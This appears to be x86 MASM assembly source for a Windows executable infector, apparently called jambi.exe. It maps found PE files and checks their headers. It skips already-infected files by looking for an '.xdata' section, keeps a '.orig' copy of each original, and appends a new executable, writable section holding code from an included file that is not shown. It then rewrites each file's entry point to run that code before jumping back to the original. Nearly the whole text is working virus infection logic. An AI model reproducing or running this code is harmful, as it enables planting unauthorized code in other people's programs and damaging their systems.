.data

Err_SkipJambi		db  " -> Warning: jambi.exe has been skipped", 10, 0
Err_EmptyFile		db  " -> Error: the file may be empty", 10, 0
Err_FileValid   	db  " -> Success: file is valid!", 10, 0
Err_FileInvalid 	db  " -> Error: file is invalid!", 10, 0
Err_FileInfected        db  " -> Error: file has been infected!",10,0

NameExt                 db  ".orig",0
MySectionName           db  ".xdata",0

Filter      		db  "jambi.exe", 0

.data?

hFile			dd  ?
hMapObject  		dd  ?
uFileMap    		dd  ?
NumberOfSections 	dd  ?
buffer			db  512 dup(?)

dwFileSize        dd  ?
FileName          db  512 dup(?)
NewFileName       db  512 dup(?)

.code

include             mycode.asm

_Align		proc	_dwSize,_dwAlign

		push	edx
		mov	eax,_dwSize
		xor	edx,edx
		div	_dwAlign
		.if	edx				;eax=Quotient, edx=reminder
			inc	eax
		.endif
		mul	_dwAlign
		pop	edx
		ret

_Align		endp



_Inject proc pData:DWORD
    local   @dwTemp,@dwEntry,@dwAddCodeBase,@dwAddCodeFile,@OldEntryPoint
    mov edi, pData
    assume edi:ptr WIN32_FIND_DATA

    ;; Test if the file to inject is jambi.exe
    invoke lstrcmp, addr [edi].cFileName, addr Filter
    .if (eax==0)
	invoke StdOut, addr Err_SkipJambi
        ret
    .endif
    ;; End of test

    invoke  lstrcpy, addr FileName,addr [edi].cFileName
    invoke  StdOut, addr [edi].cFileName ;; printing filename out without new line

    invoke	CreateFile,addr [edi].cFileName,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
    mov     hFile, eax

    ;;invoke	GetFileSize,eax,NULL ;; we're not using this part of code
    ;;mov		dwFileSize,eax ;; we're not using this part of code

    invoke  CreateFileMapping, hFile, NULL, PAGE_READWRITE, NULL, NULL, NULL

    mov     hMapObject, eax
    invoke  MapViewOfFile, hMapObject, FILE_MAP_ALL_ACCESS, NULL, NULL, NULL
    .if (eax==0)
	invoke StdOut, addr Err_EmptyFile
        ret
    .endif
    mov     uFileMap, eax ;; we're storing base address to uFileMap

    ;; check if the file is valid

    mov     edi, uFileMap
    assume  edi:ptr IMAGE_DOS_HEADER
    .if [edi].e_magic==IMAGE_DOS_SIGNATURE
        add    edi,[edi].e_lfanew ;; we are adding the e_lfanew offet to uFileMap to get the address of PE header
        assume edi:ptr IMAGE_NT_HEADERS
        .if [edi].Signature!=IMAGE_NT_SIGNATURE
	    jmp error_message
        .endif
     .else
	jmp error_message
    .endif
   




    ;;edx->the last section header
    ;;ebx->the new section header

    movzx   eax,[edi].FileHeader.NumberOfSections
    dec     eax
    mov     ecx,sizeof IMAGE_SECTION_HEADER
    mul     ecx

    mov     edx,edi
    add     edx,eax
    add     edx,sizeof IMAGE_NT_HEADERS
;; now edx points to the beginning of the last section header
    mov     ebx,edx
    add     ebx,sizeof IMAGE_SECTION_HEADER
;; now ebx points to the end of the last section header and points to the beginning of new section header
    assume  ebx:ptr IMAGE_SECTION_HEADER,edx:ptr IMAGE_SECTION_HEADER

    ;; whehter the file is infected
	
	pushad
	lea edi, MySectionName
	lea	esi,[edx].Name1			; the func we needed
	mov	ecx,6
	cld
	repz	cmpsb				; compare two names, finish until there is different char
	.if	ZERO?					; find 
		popad
		jmp	error_infected
	.endif
	
	
	;; copy the orignal file and rename it
    invoke  lstrcpy,addr NewFileName,addr FileName
    invoke  lstrcat,addr NewFileName,addr NameExt
    invoke  CopyFile,addr FileName,addr NewFileName,FALSE
	
	popad
    ;;add a new section header
	
    inc	[edi].FileHeader.NumberOfSections

    mov	eax,[edx].PointerToRawData
    add	eax,[edx].SizeOfRawData
    mov	[ebx].PointerToRawData,eax
    
    mov	ecx,offset APPEND_CODE_END-offset APPEND_CODE
    invoke	_Align,ecx,[edi].OptionalHeader.FileAlignment
    mov	[ebx].SizeOfRawData,eax
    
    invoke	_Align,ecx,[edi].OptionalHeader.SectionAlignment
    add	[edi].OptionalHeader.SizeOfCode,eax	;correct SizeOfCode
    add	[edi].OptionalHeader.SizeOfImage,eax	;correct SizeOfImage
    
    invoke	_Align,[edx].Misc.VirtualSize,[edi].OptionalHeader.SectionAlignment
    add	eax,[edx].VirtualAddress
    mov	[ebx].VirtualAddress,eax
    mov	[ebx].Misc.VirtualSize,offset APPEND_CODE_END-offset APPEND_CODE
    mov	[ebx].Characteristics,IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE

    invoke	lstrcpy,addr [ebx].Name1,addr MySectionName  ;;section name

    ;; insert the new section at the end of the file
    
    invoke	SetFilePointer,hFile,[ebx].PointerToRawData,NULL,FILE_BEGIN
    invoke	WriteFile,hFile,offset APPEND_CODE,[ebx].Misc.VirtualSize,addr @dwTemp,NULL
    mov	eax,[ebx].PointerToRawData
    add	eax,[ebx].SizeOfRawData
    invoke	SetFilePointer,hFile,eax,NULL,FILE_BEGIN
    invoke	SetEndOfFile,hFile

    ;; store the old entry point
    push    [edi].OptionalHeader.AddressOfEntryPoint
    pop     @OldEntryPoint

    ;; correct the entrypoint
    mov     eax,[ebx].VirtualAddress 
    add     eax,(offset _NewEntry-offset APPEND_CODE)  
    mov     [edi].OptionalHeader.AddressOfEntryPoint,eax
   
    ;; jump 
    push	@OldEntryPoint
    pop	@dwEntry
    mov	eax,[ebx].VirtualAddress
    add	eax,(offset _ToOldEntry-offset APPEND_CODE+5)
    sub	@dwEntry,eax

    mov	ecx,[ebx].PointerToRawData
    add	ecx,(offset _dwOldEntry-offset APPEND_CODE)
    invoke	SetFilePointer,hFile,ecx,NULL,FILE_BEGIN
    invoke	WriteFile,hFile,addr @dwEntry,4,addr @dwTemp,NULL

    
    ;; close file
    invoke  UnmapViewOfFile,uFileMap
    invoke  CloseHandle,hMapObject
    invoke  CloseHandle,hFile
    
    invoke StdOut, addr Err_FileValid
    ret ;; its a mandatory to stupid guys!!!

error_infected:
    invoke  StdOut, addr Err_FileInfected
    ret
error_message:
invoke  StdOut, addr Err_FileInvalid
ret

_Inject endp
